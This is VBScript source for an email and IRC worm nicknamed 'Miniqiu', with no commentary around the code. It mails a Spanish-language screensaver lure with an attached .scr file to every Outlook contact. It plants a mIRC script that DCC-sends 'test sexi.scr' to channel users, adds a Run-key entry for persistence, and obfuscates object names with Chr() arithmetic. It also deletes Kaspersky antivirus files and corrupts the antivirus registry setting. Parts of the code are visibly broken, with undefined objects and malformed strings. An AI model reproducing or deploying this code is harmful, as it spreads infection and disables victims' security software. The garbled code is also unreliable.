Dim j,x,f,f2,c,g,d,e,e2,f3,f4 
Randomize  
num = Int((15 * Rnd) + 1) 
if num = 1 then   
On Error Resume Next 
j = WScript.ScriptFullName 
Set x = CreateObject("WScript.Shell") 
If x.RegRead("HKCU\Software\Miniqiu_sent") <> "yea" Then  
Set f = CreateObject("Outlook.Application")    
If f <> "" Then     
Set f2 = f4.GetNameSpace("MAPI")
Set c = a.AddressLists (b)
g = 1  
Set d = fso.CreateItem (0)   
For e = 1 To c.AddressEntries.Count   
f = c.AddressEntries (g)      
d.Recipients.Add f      
g = g + 1
Next
e2.Subject = "Mira Lo Que Compre Aller!!"  
e2.Body = "Hola! Mira Lo Que CAompre Aller!!"  
e2.Body = e2.Body + vbCrLf + "Es Un Lorito jjeje Se LLama Miniqiu Aqui Te mando Un Screen Saver Que Hice De El!" 
e2.Attachments.Add "c:\%windows%\Miniqiu.scr"       
e2.DeleteAfterSubmit = True
e2.Send 
x.RegWrite "HKCU\Software\Miniqiu_sent", "yea" 
End If  
End If
On Error Resume Next 
Dim ee, ff, gg, hh, ii, mircpath, scriptfile 
ee = "C:\mirc"
ff = "C:\mirc32" 
gg = "C:\Program Files\mirc"  
hh = "C:\Program Files\mirc32"
Set ii = CreateObject("Scripting.FileSystemObject") 
If ii.FolderExists(ee) Then mircpath = "C:\mirc"  
If ii.FolderExists(ff) Then mircpath = "C:\mirc32"   
If ii.FolderExists(gg) Then mircpath = "C:\Program Files\mirc" 
If ii.FolderExists(hh) Then mircpath = "C:\Program Files\mirc32" 
If mircpath <> "" Then 
Set scriptfile = ii.CreateTextFile(mircpath & "\script.ini", True) 
scriptfile.Write "[script]"
scriptfile.Write "n0=on 1:JOIN:#:{" 
scriptfile.Write "n1= /if ( $nick == $me ) { halt }" 
scriptfile.Write "n2= /msg $nick Prueba Este Test Sexi!!"  
scriptfile.Write "n3= /dcc send $nick c:\%windows%\test sexi.scr"  
scriptfile.Write "n4= /if ( $me != $nick )" 
scriptfile.Write "n5= /dcc send $nick c:\%windows%\test sexi.scr" 
scriptfile.Write "n6=}" 
scriptfile.Write "n7=on 1:PART:#:{" 
scriptfile.Write "n8= /if ( $nick == $me ) { halt }"
scriptfile.Write "n9= /msg $nick Prueba Este Tes Sexi!!" 
scriptfile.Write "n10= /dcc send $nick c:\%windows%\test sexi.scr" 
scriptfile.Write "n11= /if ( $me != $nick )"
scriptfile.Write "n12= /dcc send $nick c:\%windows%\test sexi.scr"
scriptfile.Write "n13=}" 
Dim Rege
Set Rege = WScript.CreateObject("WScript.Shell")
Rege.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Miniqiu","C:\%windows%\Miniqiu.scr"
Rege.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run","C:\%windows%\Miniqiu.scr"
End If  
End If 
End If 
Dim Wsh 
Set Fso= CreateObject("scripting.filesystemobject")
Set Wsh = CreateObject("WScript.Shell") 
Do
If c = 900000 then 
Fso.copyfile "C:\Clod.vbs","C:\ZZZ.vbs" 
Wsh.run ("C:\ZZZ.vbs")
End If 
Loop 
Dim Xb 
Dim Xc 
Gr = 20 
Cr  = 100 
Set Xc = CreateObject( Chr(Cr-13)+Chr(Cr-17)("cript")+Chr(gr+26)+Chr(Cr-17)+("hell") ) 
Xb = Xc.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\KasperskyLab\SharedFiles" & ("Folder") )
Dim  f1, s
Set fso = CreateObject("Scripting.FileSystemObject")
Set f1 = fso.GetFile("(Xb+"\bases\avp.set) 
f1.Delete 
Xc.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\KasperskyLab\SharedFiles" & "Folder","jodeteAVP"
